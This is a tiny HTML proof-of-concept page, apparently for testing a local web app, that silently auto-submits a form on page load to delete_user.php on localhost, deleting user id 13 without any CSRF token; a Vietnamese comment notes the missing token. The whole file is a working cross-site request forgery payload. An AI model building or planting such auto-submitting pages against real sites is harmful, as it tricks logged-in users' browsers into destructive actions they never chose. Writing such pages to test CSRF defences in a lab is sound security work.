<!doctype html>
<html>
<body>
  <!-- Auto-submit POST to delete_user.php WITHOUT csrf_token -->
  <form id="f" method="POST" action="http://localhost:8080/delete_user.php">
    <input name="id" value="13
    ">
    <!-- LƯU Ý: không có input csrf_token -->
  </form>
  <script>
    // Submit automatically
    document.getElementById('f').submit();
  </script>
</body>
</html>
